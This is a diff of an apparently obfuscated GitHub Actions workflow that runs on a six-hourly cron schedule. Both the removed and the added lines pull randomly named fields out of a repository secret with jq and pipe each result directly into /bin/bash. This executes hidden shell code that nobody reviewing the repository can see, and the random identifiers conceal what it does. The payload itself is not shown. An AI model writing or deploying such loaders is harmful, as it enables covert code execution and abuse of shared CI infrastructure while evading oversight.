@@ -3,28 +3,30 @@ name: gaitersvengeful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
+    - cron: '34 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaitersvengeful
         env:
-          e0: ${{ secrets.e0 }}
+          i06760: ${{ secrets.i06760 }}
         run: |
-          echo $e0 | jq -r .gbi7 | /bin/bash
-          echo $wgdk12741 | jq -r .fm958 | /bin/bash
-          echo $wclp8 | jq -r .fqb5 | /bin/bash
-          echo $yr5 | jq -r .mv98796 | /bin/bash
-          echo $lpzff51 | jq -r .vibey72 | /bin/bash
-          echo $yc83945 | jq -r .fwmm8 | /bin/bash
-          echo $fa1 | jq -r .lolcg552 | /bin/bash
-          echo $g6732 | jq -r .w8 | /bin/bash
-          echo $wwre8 | jq -r .myf0986 | /bin/bash
-          echo $g4714 | jq -r .xtrtf7753 | /bin/bash
-          echo $i54 | jq -r .ftkd452 | /bin/bash
-          echo $axcu4967 | jq -r .kdsiw871 | /bin/bash
-          echo $tlilt168 | jq -r .d5740 | /bin/bash
+          echo $i06760 | jq -r .olao6 | /bin/bash
+          echo $fsocn23944 | jq -r .f0523 | /bin/bash
+          echo $blaz77499 | jq -r .wv4196 | /bin/bash
+          echo $o78032 | jq -r .e9 | /bin/bash
+          echo $yc1351 | jq -r .zujuo2001 | /bin/bash
+          echo $eq100 | jq -r .yjsoz67377 | /bin/bash
+          echo $kuiu9 | jq -r .qo871 | /bin/bash
+          echo $a0784 | jq -r .cnde23 | /bin/bash
+          echo $wjt23040 | jq -r .anrn01 | /bin/bash
+          echo $noro3494 | jq -r .mor871 | /bin/bash
+          echo $sgvcp20220 | jq -r .gduwt11 | /bin/bash
+          echo $exkt9 | jq -r .f114 | /bin/bash
+          echo $fbqf578 | jq -r .knms3394 | /bin/bash
+          echo $lgxx883 | jq -r .itus7900 | /bin/bash
+          echo $xvjmc6 | jq -r .urq350 | /bin/bash
 
